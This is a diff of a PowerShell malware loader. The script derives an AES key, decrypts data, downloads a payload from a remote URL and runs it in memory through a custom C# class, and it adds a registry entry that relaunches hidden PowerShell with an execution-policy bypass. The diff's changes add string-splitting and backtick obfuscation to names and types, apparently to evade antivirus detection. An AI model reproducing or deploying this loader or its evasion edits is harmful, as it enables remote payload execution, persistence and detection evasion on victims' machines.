@@ -2,7 +2,7 @@
 [System.Threading.Thread]::CurrentThread.CurrentUICulture = [System.Globalization.CultureInfo]::InvariantCulture
 $ErrorActionPreference = ("{3}{1}{0}{2}" -f 'lyConti','ilent','nue','S')
 
-function fnCalc {
+function fncA`Lc {
     $seg = 100
     $inc = 4.0 / $seg
     $acc = 0.0
@@ -20,7 +20,7 @@ $lineB = ("{2}{0}{1}"-f'worb_kci','uq_','_n')
 $lineC = "eht"
 $all = $lineA + $lineB + $lineC
 
-function fnKey($calcVal, $ss) {
+function f`NkEY($calcVal, $ss) {
     $combo = $calcVal + $ss
     if ($combo.Length -lt 16) { $combo += "0" * (16 - $combo.Length) }
     return [Text.Encoding]::UTF8.GetBytes($combo.Substring(0, 16))
@@ -28,16 +28,16 @@ function fnKey($calcVal, $ss) {
 
 $z = fnCalc
 $k = fnKey $z $all
-$v = New-Object Byte[](16)
+$v = New-Object ("{1}{0}" -f']','Byte[')(16)
 
-function fnDec {
+function FNd`EC {
     param(
         [string]$c,
         [byte[]]$kk,
         [byte[]]$iv
     )
     [byte[]]$raw = [Convert]::FromBase64String($c)
-    $aes = New-Object System.Security.Cryptography.AesManaged
+    $aes = New-Object ("{8}{7}{6}{1}{2}{10}{0}{3}{5}{11}{4}{9}" -f '.','u','r','Crypt','.A','ograp','em.Sec','yst','S','esManaged','ity','hy')
     $aes.Key = $kk
     $aes.IV = $iv
     $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -165,7 +165,7 @@ public class xR {
 }
 
 try {
-    $wc = New-Object System.Net.WebClient
+    $wc = New-Object ("{0}{2}{5}{6}{3}{1}{4}"-f'Syst','lien','em.N','C','t','et','.Web')
     [byte[]]$payload = $wc.DownloadData($u)
     if ($payload -and $payload.Length -gt 0) {
         [xR]::zQ($payload, $px) | Out-Null
@@ -255,5 +255,5 @@ $stB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($st))
 $rcmd = ('powersh'+'ell'+'.e'+'xe '+'-No'+'P'+'rofile '+'-Wind'+'o'+'wSty'+'le '+'Hid'+'d'+'en '+'-'+'Ex'+'ec'+'ut'+'ionPo'+'licy '+'Bypas'+'s '+'-'+'Encod'+'e'+'dCommand'+' '+"$stB64 "+'-u'+' '+"`"$u`" "+'-p'+' '+"`"$px`"")
 
 try {
-    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType String -Force | Out-Null
+    New-ItemProperty -Path $rp -Name $rv -Value $rcmd -PropertyType ("{1}{0}" -f'g','Strin') -Force | Out-Null
 } catch {}
